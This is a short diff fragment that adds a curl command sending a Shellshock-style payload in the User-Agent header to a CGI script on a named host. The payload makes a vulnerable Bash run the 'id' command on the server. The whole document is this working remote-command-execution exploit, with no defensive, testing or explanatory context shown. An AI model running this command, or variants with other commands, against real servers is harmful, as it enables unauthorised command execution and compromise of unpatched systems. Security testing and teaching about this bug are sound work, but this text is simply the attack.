@@ -1,0 +1,3 @@
+curl -i --max-time 15 \
+  -A '() { :; }; /bin/bash -c "id"' \
+  http://juice.ccc.com/cgi-bin/test.cgi
